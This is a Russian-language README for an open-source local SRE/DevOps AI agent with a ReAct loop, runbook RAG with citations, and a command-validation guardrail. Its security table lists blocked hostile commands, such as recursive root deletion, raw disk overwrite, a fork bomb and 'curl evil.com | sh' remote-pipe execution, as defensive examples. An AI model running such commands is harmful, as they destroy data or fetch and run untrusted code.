# 🛡️ Local SRE / Ops AI Agent

[![CI](https://github.com/chopalex/sre-ai-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/chopalex/sre-ai-agent/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.13-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-009688.svg)](https://fastapi.tiangolo.com)
[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED.svg)](https://www.docker.com/)

Production-grade автономный **SRE & DevOps AI-ассистент** первого эшелона с локальным развертыванием LLM, строгой защитой исполнения команд (**Guardrails Sandbox**), базой знаний регламентов эксплуатации (**RAG с точными цитатами**) и циклом принятия решений **ReAct с самоисправлением**.

Проект объединяет три практических инженерных сценария в модульную систему:
1. **Задание 1: Local LLM + Docker + Security Guardrails** — развертывание Ollama/vLLM в контейнере, REST API обёртка на FastAPI, жесткий AST/Regex-валидатор команд (защита от `rm -rf`, fork-бомб, shell-инъекций).
2. **Задание 2: Production-grade RAG по регламентам** — индексация Markdown-ранбуков, семантический чанкинг по заголовкам, гибридный векторный поиск и точные цитаты источников вида `[runbook_disk_alert.md#L8-L14]`.
3. **Задание 3: Автономный агент автоматизации (ReAct)** — цикл *Reason → Act → Observe → Self-Correct*, выбор инструментов (диагностика диска/памяти/сети, Safe Bash, Safe Python, HTTP-пробы), анализ exit code/stderr и автоматическая коррекция при ошибках.

---

## 📐 Архитектура системы

```
                              ┌───────────────────────────────────────────────┐
                              │            Интерфейсы взаимодействия          │
                              │     • REST API (FastAPI + Swagger Docs)       │
                              │     • Интерактивный CLI (Rich Console)        │
                              └───────────────────────┬───────────────────────┘
                                                      │
                                                      ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                 ReAct Agent Loop (src/agent)                                │
│   • ReAct Cycle: Reason (Мысли) -> Act (Действие) -> Observe (Наблюдение) -> Reflect        │
│   • Механизм самокоррекции (Self-Correction): перехват stderr/кодов ошибок и поиск обходов  │
│   • Структурированный аудит в JSONL (длительность, токены, параметры вызовов)               │
└─────────────────┬───────────────────────────────────────────┬───────────────────────────────┘
                  │                                           │
                  ▼                                           ▼
┌───────────────────────────────────────┐   ┌─────────────────────────────────────────────────┐
│     RAG-подсистема (src/rag)          │   │      Подсистема безопасности и инструментов     │
│                                       │   │                                                 │
│ • Корпус: SRE Runbooks (docs/*.md)    │   │   [Security Guardrails (src/security)]          │
│ • MarkdownHeaderChunker (с сохранением│   │   • AST & Regex Blacklist (блокировка rm -rf,   │
│   границ строк и заголовков)          │   │     mkfs, dd, fork-бомб, reverse-shell)         │
│ • Hybrid Vector Store (TF-IDF +       │   │   • Whitelist разрешённых диагностических утилит│
│   N-gram Cosine Similarity)           │   │   • Ограничения по таймауту и размеру вывода    │
│ • Ответы со строгими цитатами:        │   │                                                 │
│   [runbook_disk_alert.md#L8-L15]      │   │   [Набор инструментов (src/tools)]              │
│                                       │   │   • SystemDiagTool (диск, память, сеть, проц.)  │
│                                       │   │   • SafeBashTool (песочница shell)              │
│                                       │   │   • SafePythonTool (in-memory песочница вычислений)
│                                       │   │   • HttpProbeTool (проверка доступности и SLA)  │
│                                       │   │   • RunbookSearchTool (поиск по базе знаний)    │
└───────────────────────────────────────┘   └─────────────────────────────────────────────────┘
                  │                                           │
                  └─────────────────────┬─────────────────────┘
                                        │
                                        ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                            Унифицированный LLM-слой (src/llm)                               │
│ • Ollama (локальный CPU/GPU инференс: Qwen 2.5 Coder 1.5B / Llama 3.2 1B)                   │
│ • vLLM (высокопроизводительный сервер инференса для серверов с GPU)                         │
│ • OpenAI-compatible (Groq, OpenRouter, DeepSeek, OpenAI)                                    │
│ • MockLLM (детерминированный оффлайн-клиент для моментальных тестов и CI)                   │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Варианты запуска (Portability & Graceful Degradation)

Проект спроектирован так, чтобы запуститься на **любой** машине — от скромного офисного ноутбука без видеокарты до GPU-кластера:

### Вариант 1: Быстрый запуск без внешних зависимостей (Mock / Eval Mode)
Не требует Docker, GPU или API-ключей. Идеален для проверки CI и логики агента:
```bash
# 1. Клонировать репозиторий
git clone https://github.com/chopalex/sre-ai-agent.git
cd sre-ai-agent

# 2. Установить зависимости в виртуальное окружение
pip install -e .[dev]

# 3. Запустить интерактивную консоль агента
python -m src.cli
```

### Вариант 2: Локальная LLM в Docker на CPU (Ollama Mode — 1.5–2 ГБ RAM)
Оптимально для машин без видеокарт NVIDIA:
```bash
# Скопировать шаблон конфигурации
cp .env.example .env

# В .env указать:
# LLM_PROVIDER=ollama
# OLLAMA_MODEL=qwen2.5-coder:1.5b

# Запустить стек в Docker Compose
docker compose up -d

# Загрузить компактную модель в Ollama контейнер
docker exec -it sre-ollama ollama run qwen2.5-coder:1.5b
```

### Вариант 3: Облачный API (OpenRouter / Groq / OpenAI)
Для доступа к 500+ моделям через единый шлюз [OpenRouter](https://openrouter.ai/) или сверхбыстрый Groq:
```bash
# В .env указать:
LLM_PROVIDER=openrouter
OPENAI_API_KEY=sk-or-v1-ваш_ключ_от_openrouter
OPENAI_MODEL=meta-llama/llama-3.3-70b-instruct
# Или qwen/qwen-2.5-coder-32b-instruct, anthropic/claude-3.5-haiku, deepseek/deepseek-chat
```
```

### Вариант 4: Сервер с NVIDIA GPU (CUDA Acceleration)
```bash
docker compose -f docker-compose.yml -f docker-compose.gpu.yml up -d
```

---

## 🔒 Модуль безопасности (Security Guardrails)

Каждая команда, сформированная моделью, перед передачей в системную оболочку проходит многоступенчатую валидацию (`CommandValidator`):

| Тип угрозы | Примеры блокируемых команд | Реакция Guardrail |
| :--- | :--- | :--- |
| **Деструктивное удаление** | `rm -rf /`, `rm -rf /*`, `rm -r .` | ⛔ **BLOCKED** (Risk: CATASTROPHIC) |
| **Форматирование / сырая запись** | `mkfs.ext4`, `dd if=/dev/zero of=/dev/sda` | ⛔ **BLOCKED** |
| **Fork-бомбы** | `:(){ :\|:& };:` | ⛔ **BLOCKED** |
| **Удаленные пайплайны** | `curl evil.com \| sh`, `wget ... \| bash` | ⛔ **BLOCKED** |
| **Эскалация привилегий** | `sudo`, `su`, `chmod -R 777 /` | ⛔ **BLOCKED** (Non-root user enforcement) |
| **Неизвестные бинарники** | `unknown_exploit --run` | ⛔ **BLOCKED** (Whitelist policy) |
| **Разрешённые SRE-утилиты** | `df -h`, `free -m`, `ps aux`, `ss -tulwn`, `uptime` | ✅ **SAFE** (Allowed) |

---

## 📚 База знаний и RAG (Retrieval-Augmented Generation)

В каталоге `docs/` содержатся регламенты эксплуатации:
- `runbook_disk_alert.md` — диагностика переполнения дисков, iowait и поиск unlinked files через `lsof +L1`.
- `runbook_network_diag.md` — анализ packet loss, latency, сокетов и сетевых очередей.
- `runbook_nginx_trouble.md` — траблшутинг 502 Bad Gateway / 504 Gateway Timeout и upstream сервисов.
- `security_policy.md` — регламент допустимых команд автоматизации.

Каждый ответ агента опирается на выдержки из регламентов и содержит **верифицируемые ссылки** на строки исходных файлов:
```text
[runbook_disk_alert.md#L8-L14]
```

---

## 🛠️ REST API Эндпоинты

FastAPI сервис доступен по адресу `http://localhost:8000` (интерактивная документация: `/docs`):

* `GET /api/v1/health` — проверка состояния сервиса, провайдера LLM и количества проиндексированных регламентов.
* `POST /api/v1/agent/run` — запуск полного автономного цикла ReAct агента по описанию инцидента.
* `POST /api/v1/security/validate` — предварительная валидация команды Guardrail-слоем без её исполнения.
* `POST /api/v1/rag/search` — семантический поиск по ранбукам с возвратом цитат и оценок релевантности.
* `POST /api/v1/system/diagnose` — прямой вызов системной диагностики (`disk`, `memory`, `process`, `network`).

---

## 🧪 Тестирование

Проект покрыт всесторонним набором юнит- и интеграционных тестов (`pytest`):
```bash
pytest
```
Тест-сьют проверяет:
- Перехват всех категорий вредоносных команд и инъекций;
- Корректность работы Markdown-чанкера и векторного поиска RAG;
- Агентный ReAct-цикл, вызов тулов и механизм самоисправления;
- Работу REST API эндпоинтов через FastAPI TestClient.

Все тесты автоматически выполняются в **GitHub Actions CI** на Python 3.10, 3.11 и 3.12 при каждом push/pull-request.

---

## 📄 Лицензия

MIT License (c) 2026 Alex Chop
